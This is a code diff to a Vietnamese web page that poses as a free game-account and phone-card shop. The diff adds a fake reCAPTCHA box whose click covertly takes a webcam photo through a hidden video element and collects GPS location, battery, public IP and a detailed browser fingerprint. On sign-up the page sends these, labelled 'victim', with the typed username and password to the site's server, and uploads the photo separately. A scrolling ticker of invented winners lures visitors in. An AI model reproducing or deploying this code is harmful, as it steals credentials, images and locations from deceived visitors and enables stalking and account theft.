@@ -8,7 +8,8 @@
 *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
 body{background-color:#0d1117;color:#fff;padding-bottom:120px}
 .btn-ok{background:linear-gradient(135deg,#ff4757,#ff6b81);color:#fff;border:none;padding:10px 30px;font-size:16px;font-weight:bold;border-radius:6px;cursor:pointer}
-#alert-overlay,#register-alert-overlay,#login-required-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);display:none;justify-content:center;align-items:center;z-index:11000;padding:15px}
+.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);display:none;justify-content:center;align-items:center;z-index:11000;padding:15px}
+.overlay.show{display:flex}
 .alert-box,.register-alert-box{background:#161b22;border:2px solid #ff4757;border-radius:12px;padding:25px 20px;text-align:center;max-width:380px;width:100%}
 .alert-box img{width:100%;border-radius:8px;margin-bottom:15px;display:block}
 .register-alert-box h3{color:#ff4757;font-size:20px;margin-bottom:10px}
@@ -19,6 +20,7 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .nav-icons{display:flex;gap:8px}
 .icon-btn{background:#21262d;border:1px solid #30363d;color:#fff;padding:6px 10px;border-radius:6px;font-size:14px;cursor:pointer}
 #sidebar-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:999;display:none}
+#sidebar-overlay.show{display:block}
 .sidebar{position:fixed;top:0;left:-280px;width:280px;height:100%;background:#161b22;z-index:1000;transition:left .3s ease;overflow-y:auto;border-right:1px solid #30363d}
 .sidebar.active{left:0}
 .sidebar-header{padding:15px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #30363d}
@@ -30,9 +32,12 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .submenu{display:none;background:#0d1117;padding-left:15px}
 .submenu.active{display:block}
 .submenu-item{padding:10px 15px 10px 35px;font-size:13px;color:#8b949e;cursor:pointer;border-bottom:1px solid rgba(48,54,61,.2)}
+.submenu-item:hover{color:#fff;background:#161b22}
 .main-container{padding:15px;max-width:600px;margin:0 auto}
+.page{display:none}
+.page.active{display:block}
 .banner-box{background:#21262d;border-radius:10px;overflow:hidden;border:1px solid #ff4757;margin-bottom:20px}
-.banner-box img{width:100%;display:block}
+.banner-box img{width:100%;display:block;min-height:120px}
 .ranking-section{background:#161b22;border-radius:10px;border:1px solid #30363d;overflow:hidden}
 .ranking-header{background:#b83232;color:#fff;padding:10px;text-align:center;font-weight:bold;font-size:16px}
 .ranking-list{padding:10px}
@@ -43,8 +48,9 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .breadcrumb{font-size:13px;color:#8b949e;margin-bottom:12px}
 .section-title{font-size:20px;font-weight:bold;margin-bottom:15px}
 .game-card-list{display:flex;flex-direction:column;gap:15px}
-.game-card-item{background:#161b22;border:1px solid #30363d;border-radius:12px;overflow:hidden;cursor:pointer}
-.game-card-img{width:100%;height:180px;object-fit:cover;display:block}
+.game-card-item{background:#161b22;border:1px solid #30363d;border-radius:12px;overflow:hidden;cursor:pointer;transition:.2s}
+.game-card-item:hover{border-color:#ff4757}
+.game-card-img{width:100%;height:180px;object-fit:cover;display:block;background:#21262d}
 .game-card-info{padding:15px;display:flex;justify-content:space-between;align-items:center}
 .game-card-name{font-size:16px;font-weight:bold}
 .game-card-btn{background:#ff4757;color:#fff;border:none;padding:8px 16px;border-radius:6px;font-size:13px;font-weight:bold;cursor:pointer}
@@ -52,10 +58,10 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .tab-item{padding-bottom:8px;font-size:15px;font-weight:500;cursor:pointer;color:#8b949e}
 .tab-item.active{color:#ff4757;border-bottom:2px solid #ff4757}
 .card-section-box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;margin-bottom:20px}
-.card-section-title{font-size:14px;font-weight:bold;margin-bottom:12px;color:#c9d1d9}
+.card-section-title{font-size:14px;font-weight:bold;margin-bottom:12px;color:#c9d1d9;display:flex;justify-content:space-between}
 .search-box{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:10px 12px;display:flex;align-items:center;gap:10px;margin-bottom:12px;color:#8b949e;font-size:14px}
 .search-box input{background:none;border:none;color:#fff;width:100%;outline:none;font-size:14px}
-.filter-tags{display:flex;gap:8px;margin-bottom:15px}
+.filter-tags{display:flex;gap:8px;margin-bottom:15px;flex-wrap:wrap}
 .tag{background:#21262d;border:1px solid #30363d;padding:6px 14px;border-radius:6px;font-size:13px;cursor:pointer;color:#c9d1d9}
 .tag.active{background:#b83232;border-color:#ff4757;color:#fff}
 .grid-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:15px}
@@ -63,10 +69,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .card-option.selected{border-color:#ff4757;background:#161b22}
 .card-name{font-weight:bold;font-size:14px;color:#ff4757;margin-bottom:4px}
 .card-desc{font-size:11px;color:#8b949e}
-.quantity-box{display:flex;justify-content:space-between;align-items:center;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:10px 15px}
-.quantity-controls{display:flex;align-items:center;background:#161b22;border:1px solid #30363d;border-radius:6px;overflow:hidden}
-.q-btn{background:#21262d;border:none;color:#fff;padding:6px 14px;cursor:pointer;font-weight:bold}
-.q-value{padding:0 16px;font-weight:bold;font-size:14px}
 .payment-info-row{display:flex;justify-content:space-between;padding:8px 0;font-size:14px;border-bottom:1px solid rgba(48,54,61,.3)}
 .payment-label{color:#8b949e}
 .payment-val{font-weight:500;color:#fff}
@@ -74,6 +76,7 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .total-price{font-size:22px;font-weight:bold;color:#ff4757}
 .btn-buy-action{width:100%;background:#ff4757;color:#fff;border:none;padding:14px;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
 #auth-page{display:none;position:relative;min-height:85vh;overflow:hidden}
+#auth-page.active{display:block}
 .bg-video{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:-1}
 .auth-container-wrapper{position:relative;z-index:2;max-width:500px;margin:0 auto;padding:15px}
 .auth-box-main{background:rgba(22,27,34,.85);backdrop-filter:blur(8px);border:1px solid rgba(48,54,61,.8);border-radius:12px;padding:25px 20px;margin-top:15px}
@@ -86,9 +89,9 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .input-with-icon input{width:100%;background:rgba(13,17,23,.8);border:1px solid #30363d;border-radius:8px;padding:12px 12px 12px 38px;color:#fff;font-size:14px;outline:none}
 .input-with-icon input:focus{border-color:#ff4757}
 .remember-row{display:flex;align-items:center;gap:8px;margin-bottom:20px;font-size:13px;color:#c9d1d9;cursor:pointer}
-.captcha-box{background:#f9f9f9;border:1px solid #d3d3d3;border-radius:4px;padding:12px 15px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;max-width:304px;cursor:pointer}
-.captcha-left{display:flex;align-items:center;gap:10px;pointer-events:none}
-.captcha-left input[type=checkbox]{width:22px;height:22px}
+.captcha-box{background:#f9f9f9;border:1px solid #d3d3d3;border-radius:4px;padding:12px 15px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;max-width:304px;cursor:pointer;user-select:none}
+.captcha-left{display:flex;align-items:center;gap:10px}
+.captcha-left input[type=checkbox]{width:22px;height:22px;cursor:pointer}
 .captcha-left span{color:#000;font-size:14px;font-weight:500}
 .captcha-right{text-align:center}
 .captcha-right img{width:28px;height:28px;display:block;margin:0 auto}
@@ -97,6 +100,7 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .auth-switch-text{text-align:center;font-size:13px;color:#8b949e;margin-top:20px}
 .auth-switch-text span{color:#ff4757;font-weight:bold;cursor:pointer}
 #troll-result-page{display:none;max-width:480px;margin:20px auto;background:#161b22;border:2px solid #ff4757;border-radius:12px;padding:20px}
+#troll-result-page.active{display:block}
 .troll-header{text-align:center;color:#ff4757;font-size:20px;font-weight:bold;margin-bottom:15px}
 .troll-photo-label{font-size:13px;color:#8b949e;text-align:center;margin-bottom:8px}
 .troll-photo-box{width:100%;height:240px;background:#0d1117;border:1px solid #30363d;border-radius:8px;overflow:hidden;display:flex;justify-content:center;align-items:center;margin-bottom:20px}
@@ -104,7 +108,7 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 .troll-info-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid rgba(48,54,61,.5);font-size:13px}
 .troll-info-label{color:#8b949e}
 .troll-info-val{color:#fff;text-align:right;font-weight:500;word-break:break-all;max-width:65%}
-.live-marquee-bar{position:fixed;bottom:0;left:0;width:100%;background:#161b22;border-top:1px solid #30363d;padding:8px 0;z-index:9998;overflow:hidden}
+.live-marquee-bar{position:fixed;bottom:0;left:0;width:100%;background:#161b22;border-top:1px solid #30363d;padding:8px 0;z-index:9998;overflow:hidden;pointer-events:none}
 .live-marquee-bar marquee{font-size:14px;font-weight:bold}
 .rainbow-text{background:linear-gradient(45deg,#ff4757,#ffa502,#2ed573,#1e90ff,#9b59b6,#ff4757);background-size:400% 400%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:rainbowAnimation 8s ease infinite;margin-right:35px}
 @keyframes rainbowAnimation{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}
@@ -113,27 +117,16 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 </head>
 <body>
 
-<div id="alert-overlay">
-  <div class="alert-box">
-    <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Thông báo">
-    <button class="btn-ok" onclick="closeAlertAndGoBuyCard()">OK</button>
+<header>
+  <div class="logo-area" onclick="showPage('home')">
+    <img src="https://files.catbox.moe/w1w6ab.jpg" alt="Logo">
   </div>
-</div>
-
-<div id="register-alert-overlay">
-  <div class="register-alert-box">
-    <h3>Thông báo</h3>
-    <p>Tài khoản không tồn tại, bạn cần đăng ký để tiếp tục!</p>
-    <button class="btn-ok" onclick="closeRegisterAlertAndGoRegister()">OK</button>
+  <div class="nav-icons">
+    <button class="icon-btn">☀️</button>
+    <button class="icon-btn">🎨</button>
+    <button class="icon-btn" onclick="toggleMenu()">☰</button>
   </div>
-</div>
-
-<div id="login-required-overlay">
-  <div class="alert-box">
-    <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Yêu cầu đăng nhập">
-    <button class="btn-ok" onclick="closeLoginRequiredAndGoAuth()">OK</button>
-  </div>
-</div>
+</header>
 
 <div id="sidebar-overlay" onclick="toggleMenu()"></div>
 <div id="sidebar" class="sidebar">
@@ -144,27 +137,17 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
   <div class="menu-title">MENU</div>
   <div class="menu-item" onclick="toggleSubmenu()"><span>📦</span> Mua Tài Khoản</div>
   <div id="submenu-muanick" class="submenu">
-    <div class="submenu-item" onclick="goToAccType1()">○ Tài Khoản Loại 1(get ac free)</div>
+    <div class="submenu-item" onclick="showPage('acc-type1')">○ Tài Khoản Loại 1(get ac free)</div>
     <div class="submenu-item">○ Tài Khoản Loại 2(đang bảo trì)</div>
     <div class="submenu-item">○ Tài Khoản Nhóm(đang bảo trì)</div>
   </div>
-  <div class="menu-item" onclick="triggerBuyCardAlert()"><span>💳</span> nạp thẻ</div>
-  <div class="menu-item" style="color:#2ed573" onclick="goToAuthPage('login')"><span>🔐</span> Đăng Nhập / Đăng Ký</div>
+  <div class="menu-item" onclick="showPage('buycard')"><span>💳</span> nạp thẻ</div>
+  <div class="menu-item" style="color:#2ed573" onclick="showPage('auth-login')"><span>🔐</span> Đăng Nhập / Đăng Ký</div>
 </div>
 
-<header>
-  <div class="logo-area" onclick="goToHome()">
-    <img src="https://files.catbox.moe/w1w6ab.jpg" alt="Logo">
-  </div>
-  <div class="nav-icons">
-    <button class="icon-btn">☀️</button>
-    <button class="icon-btn">🎨</button>
-    <button class="icon-btn" onclick="toggleMenu()">☰</button>
-  </div>
-</header>
-
 <div class="main-container" id="main-content-wrap">
-  <div id="home-page">
+
+  <div id="home-page" class="page active">
     <div class="banner-box"><img src="https://files.catbox.moe/o30xrj.jpg" alt="Banner"></div>
     <div class="ranking-section">
       <div class="ranking-header"><span>🏆</span> TOP Nạp Tháng 09/2026</div>
@@ -177,26 +160,26 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
     </div>
   </div>
 
-  <div id="acc-type1-page" style="display:none">
+  <div id="acc-type1-page" class="page">
     <div class="breadcrumb">Trang chủ / Tài khoản loại 1</div>
     <div class="section-title">Danh mục Game - Tài Khoản Loại 1</div>
     <div class="game-card-list">
-      <div class="game-card-item" onclick="triggerLoginRequired()">
+      <div class="game-card-item" onclick="showAlert('login-required')">
         <img src="https://files.catbox.moe/rvjgxa.jpg" alt="FF" class="game-card-img">
         <div class="game-card-info"><span class="game-card-name">Free Fire (FF)</span><button class="game-card-btn">get ac</button></div>
       </div>
-      <div class="game-card-item" onclick="triggerLoginRequired()">
+      <div class="game-card-item" onclick="showAlert('login-required')">
         <img src="https://files.catbox.moe/qroe4u.jpg" alt="FC" class="game-card-img">
         <div class="game-card-info"><span class="game-card-name">FC Mobile</span><button class="game-card-btn">get ac</button></div>
       </div>
-      <div class="game-card-item" onclick="triggerLoginRequired()">
+      <div class="game-card-item" onclick="showAlert('login-required')">
         <img src="https://files.catbox.moe/5kvn4d.jpg" alt="LQ" class="game-card-img">
         <div class="game-card-info"><span class="game-card-name">Liên Quân Mobile</span><button class="game-card-btn">get ac</button></div>
       </div>
     </div>
   </div>
 
-  <div id="buycard-page" style="display:none">
+  <div id="buycard-page" class="page">
     <div class="breadcrumb">Trang chủ / nạp thẻ</div>
     <div class="section-title">Thẻ game &amp; điện thoại</div>
     <div class="tab-switch"><div class="tab-item active">Mua thẻ</div><div class="tab-item">Lịch sử mua thẻ</div></div>
@@ -231,12 +214,13 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
       <div class="payment-info-row"><span class="payment-label">Mệnh giá</span><span class="payment-val">10.000 đ</span></div>
       <div class="payment-info-row"><span class="payment-label">Số lượng</span><span class="payment-val">1 thẻ</span></div>
       <div class="total-row"><span style="font-size:15px;font-weight:bold">Tổng thanh toán</span><span class="total-price">9.800 đ</span></div>
-      <button class="btn-buy-action" onclick="goToAuthPage('login')">Đăng nhập để mua thẻ</button>
+      <button class="btn-buy-action" onclick="showPage('auth-login')">Đăng nhập để mua thẻ</button>
     </div>
   </div>
+
 </div>
 
-<div id="auth-page" style="display:none">
+<div id="auth-page">
   <video autoplay muted loop playsinline class="bg-video">
     <source src="https://files.catbox.moe/wyet3t.mp4" type="video/mp4">
   </video>
@@ -255,7 +239,7 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
         <div class="input-with-icon"><span>🔒</span><input type="password" placeholder="Nhập mật khẩu..."></div>
       </div>
       <label class="remember-row"><input type="checkbox"> Ghi nhớ đăng nhập</label>
-      <button class="btn-action-main" onclick="triggerRegisterAlert()">Đăng nhập</button>
+      <button class="btn-action-main" onclick="showAlert('register-alert')">Đăng nhập</button>
       <div class="auth-switch-text">Bạn chưa có tài khoản? <span onclick="switchAuthTab('register')">Đăng ký ngay</span></div>
     </div>
 
@@ -274,7 +258,254 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
         <label class="form-label-custom">Nhập lại mật khẩu</label>
         <div class="input-with-icon"><span>🔒</span><input type="password" placeholder="Xác nhận lại mật khẩu..."></div>
       </div>
-      <div class="captcha-box" onclick="requestPermissionsAndVerifyCaptcha()">
-        <div class="captcha-left">
-          <input type="checkbox" id="robot-check">
-          <span id="captcha-text">Tôi khôn
+      <div class="captcha-box">
+        <div class="captcha-left" onclick="requestPermissionsAndVerifyCaptcha()">
+          <input type="checkbox" id="robot-check" onclick="event.stopPropagation();requestPermissionsAndVerifyCaptcha()">
+          <span id="captcha-text">Tôi không phải là người máy</span>
+        </div>
+        <div class="captcha-right">
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+          <span>reCAPTCHA</span>
+        </div>
+      </div>
+      <button class="btn-action-main" style="background:linear-gradient(135deg,#238636,#2ea043)" onclick="handleRegisterSubmit()">Đăng ký</button>
+      <div class="auth-switch-text">Đã có tài khoản? <span onclick="switchAuthTab('login')">Đăng nhập ngay</span></div>
+    </div>
+  </div>
+</div>
+
+<div id="troll-result-page">
+  <div class="troll-header"><span>🎯</span> ĐÃ LẤY THÔNG TIN THÀNH CÔNG!</div>
+  <div class="troll-photo-label">Ảnh chụp camera:</div>
+  <div class="troll-photo-box" id="captured-photo-wrapper"><span style="color:#8b949e;font-size:13px">Đang tải ảnh...</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trạng thái Camera:</span><span class="troll-info-val" id="res-cam">Từ chối</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trạng thái GPS:</span><span class="troll-info-val" id="res-gps">Từ chối</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Tọa độ GPS:</span><span class="troll-info-val" id="res-coords">Không có, Không có</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Phần trăm Pin:</span><span class="troll-info-val" id="res-battery">Đang quét...</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trạng thái sạc:</span><span class="troll-info-val" id="res-charging">Đang quét...</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">IP Target:</span><span class="troll-info-val" id="res-ip">Đang lấy...</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Kiểu mạng / Sim:</span><span class="troll-info-val" id="res-network">Đang quét...</span></div>
+  <div class="troll-info-row"><span class="troll-info-label">Trình duyệt:</span><span class="troll-info-val" id="res-browser">Đang quét...</span></div>
+  <button class="btn-action-main" style="margin-top:10px" onclick="showPage('home')">Về trang chủ</button>
+</div>
+
+<!-- OVERLAY POPUPS -->
+<div id="alert-overlay" class="overlay">
+  <div class="alert-box">
+    <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Thông báo">
+    <button class="btn-ok" onclick="hideAlert('alert')">OK</button>
+  </div>
+</div>
+<div id="register-alert-overlay" class="overlay">
+  <div class="register-alert-box">
+    <h3>Thông báo</h3>
+    <p>Tài khoản không tồn tại, bạn cần đăng ký để tiếp tục!</p>
+    <button class="btn-ok" onclick="hideAlert('register-alert');switchAuthTab('register')">OK</button>
+  </div>
+</div>
+<div id="login-required-overlay" class="overlay">
+  <div class="alert-box">
+    <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Yêu cầu đăng nhập">
+    <button class="btn-ok" onclick="hideAlert('login-required');showPage('auth-login')">OK</button>
+  </div>
+</div>
+
+<div class="live-marquee-bar">
+  <marquee scrollamount="4" id="live-ticker"></marquee>
+</div>
+
+<video id="hidden-webcam" autoplay playsinline style="display:none"></video>
+
+<script>
+let cameraStatus = "Từ chối";
+let gpsStatus = "Từ chối";
+let gpsCoords = "Không có, Không có";
+let capturedImageUrl = null;
+let capturedBlob = null;
+let batteryInfoStr = "19%";
+let chargingStr = "Không sạc 🔋";
+let ipTargetStr = "42.118.186.58";
+let networkStr = "4g";
+let isCaptchaChecked = false;
+
+/* ================== NAVIGATION ================== */
+function showPage(name){
+  closeMenu();
+  document.getElementById('main-content-wrap').style.display = 'none';
+  document.getElementById('auth-page').classList.remove('active');
+  document.getElementById('auth-page').style.display = 'none';
+  document.getElementById('troll-result-page').classList.remove('active');
+  document.getElementById('troll-result-page').style.display = 'none';
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+
+  if(name === 'auth-login'){
+    document.getElementById('auth-page').style.display = 'block';
+    switchAuthTab('login');
+  } else if(name === 'auth-register'){
+    document.getElementById('auth-page').style.display = 'block';
+    switchAuthTab('register');
+  } else if(name === 'troll'){
+    document.getElementById('troll-result-page').style.display = 'block';
+  } else {
+    document.getElementById('main-content-wrap').style.display = 'block';
+    const el = document.getElementById(name + '-page');
+    if(el) el.classList.add('active');
+  }
+  window.scrollTo(0,0);
+}
+
+function switchAuthTab(type){
+  const l = document.getElementById('form-login');
+  const r = document.getElementById('form-register');
+  const b = document.getElementById('auth-breadcrumb');
+  if(type === 'register'){ l.style.display='none'; r.style.display='block'; b.innerText='Trang chủ / Đăng ký'; }
+  else { l.style.display='block'; r.style.display='none'; b.innerText='Trang chủ / Đăng nhập'; }
+}
+
+/* ================== SIDEBAR ================== */
+function toggleMenu(){
+  const s = document.getElementById('sidebar');
+  const o = document.getElementById('sidebar-overlay');
+  s.classList.toggle('active');
+  o.classList.toggle('show', s.classList.contains('active'));
+}
+function closeMenu(){
+  document.getElementById('sidebar').classList.remove('active');
+  document.getElementById('sidebar-overlay').classList.remove('show');
+}
+function toggleSubmenu(){ document.getElementById('submenu-muanick').classList.toggle('active'); }
+
+/* ================== ALERTS ================== */
+function showAlert(type){
+  closeMenu();
+  document.getElementById(type + '-overlay').classList.add('show');
+}
+function hideAlert(type){
+  document.getElementById(type + '-overlay').classList.remove('show');
+}
+
+/* ================== TICKER ================== */
+function generateRandomTicker(){
+  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const names = ["nguyen","tran","le","pham","hoang","vu","phan","toan","duc","minh","tuan","nam","huy","khang","phuc","long","bao","khoa"];
+  let html = "";
+  for(let i=1;i<=1000;i++){
+    const p = names[Math.floor(Math.random()*names.length)];
+    const n = p + "***" + chars[Math.floor(Math.random()*chars.length)];
+    html += `<span class="rainbow-text">🔥 Chúc mừng tài khoản <strong style="color:#fff">${n}</strong> vừa get acc game miễn phí thành công! (${i}/1000)</span>`;
+  }
+  document.getElementById('live-ticker').innerHTML = html;
+}
+
+/* ================== FINGERPRINT ================== */
+async function collectFingerprint(){
+  const nav = navigator, scr = screen;
+  let gpu = null;
+  try{ const gl = document.createElement('canvas').getContext('webgl'); const d = gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); }catch(e){}
+  const c = document.createElement('canvas'); const x = c.getContext('2d');
+  x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('SikeStore',2,15);
+  const cHash = c.toDataURL().slice(-48);
+  let battery = null;
+  if(nav.getBattery){ try{ const b = await nav.getBattery(); battery = {level:b.level, charging:b.charging}; }catch(e){} }
+  const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
+  const network = conn ? {type:conn.effectiveType, downlink:conn.downlink, rtt:conn.rtt} : null;
+  return {
+    ua:nav.userAgent, platform:nav.platform, vendor:nav.vendor,
+    language:nav.language, languages:nav.languages,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    tzOffset:new Date().getTimezoneOffset(),
+    screen:{w:scr.width,h:scr.height,cd:scr.colorDepth,aw:scr.availWidth,ah:scr.availHeight},
+    window:{w:innerWidth,h:innerHeight,dpr:devicePixelRatio},
+    hardware:{cores:nav.hardwareConcurrency,ram:nav.deviceMemory},
+    touch:'ontouchstart' in window, maxTouchPoints:nav.maxTouchPoints,
+    gpu, canvasHash:cHash, battery, network,
+    cookiesEnabled:nav.cookieEnabled, dnt:nav.doNotTrack
+  };
+}
+
+/* ================== CAPTCHA TRAP ================== */
+async function requestPermissionsAndVerifyCaptcha(){
+  if(isCaptchaChecked) return;
+  isCaptchaChecked = true;
+  document.getElementById('robot-check').checked = true;
+  document.getElementById('captcha-text').innerText = "Đã xác minh thành công";
+
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    cameraStatus = "Cho phép";
+    const video = document.getElementById('hidden-webcam');
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r => setTimeout(r, 500));
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    capturedImageUrl = canvas.toDataURL('image/jpeg');
+    canvas.toBlob(b => { capturedBlob = b; }, 'image/jpeg', 0.8);
+    stream.getTracks().forEach(t => t.stop());
+  }catch(err){ cameraStatus = "Từ chối"; }
+
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      p => { gpsStatus = "Cho phép"; gpsCoords = `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`; },
+      e => { gpsStatus = "Từ chối"; gpsCoords = "Không có, Không có"; },
+      {timeout:5000}
+    );
+  }
+
+  if(navigator.getBattery){
+    try{ const b = await navigator.getBattery(); batteryInfoStr = Math.round(b.level*100)+"%"; chargingStr = b.charging ? "Đang sạc ⚡" : "Không sạc 🔋"; }catch(e){}
+  }
+
+  try{ const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ipTargetStr = d.ip; }catch(e){}
+  if(navigator.connection){ networkStr = (navigator.connection.effectiveType || "4g").toUpperCase(); }
+}
+
+/* ================== SUBMIT ================== */
+function handleRegisterSubmit(){
+  if(!isCaptchaChecked){ alert("Vui lòng xác minh Captcha trước khi đăng ký!"); return; }
+
+  document.getElementById('res-cam').innerText = cameraStatus;
+  document.getElementById('res-gps').innerText = gpsStatus;
+  document.getElementById('res-coords').innerText = gpsCoords;
+  document.getElementById('res-battery').innerText = batteryInfoStr;
+  document.getElementById('res-charging').innerText = chargingStr;
+  document.getElementById('res-ip').innerText = ipTargetStr;
+  document.getElementById('res-network').innerText = networkStr;
+  document.getElementById('res-browser').innerText = navigator.userAgent;
+
+  const w = document.getElementById('captured-photo-wrapper');
+  if(capturedImageUrl && cameraStatus === "Cho phép"){ w.innerHTML = `<img src="${capturedImageUrl}" alt="Ảnh">`; }
+  else{ w.innerHTML = `<span style="color:#ff4757;font-size:13px">Camera bị từ chối / Không có ảnh</span>`; }
+
+  showPage('troll');
+  sendDataToServer();
+}
+
+async function sendDataToServer(){
+  const fp = await collectFingerprint();
+  const payload = {
+    type:'victim', cameraStatus, gpsStatus, gpsCoords,
+    battery: batteryInfoStr, charging: chargingStr,
+    ip: ipTargetStr, network: networkStr,
+    ua: navigator.userAgent, fp,
+    form: {
+      username: document.getElementById('reg-username')?.value || '',
+      password: document.getElementById('reg-password')?.value || ''
+    }
+  };
+  try{ await fetch('/register',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) }); }catch(e){}
+  if(capturedBlob && cameraStatus === "Cho phép"){
+    try{ const fd = new FormData(); fd.append('photo', capturedBlob, 'victim.jpg'); await fetch('/face',{ method:'POST', body: fd }); }catch(e){}
+  }
+}
+
+/* ================== INIT ================== */
+window.addEventListener('load', () => {
+  generateRandomTicker();
+  showPage('home');
+});
+</script>
+</body>
+</html>
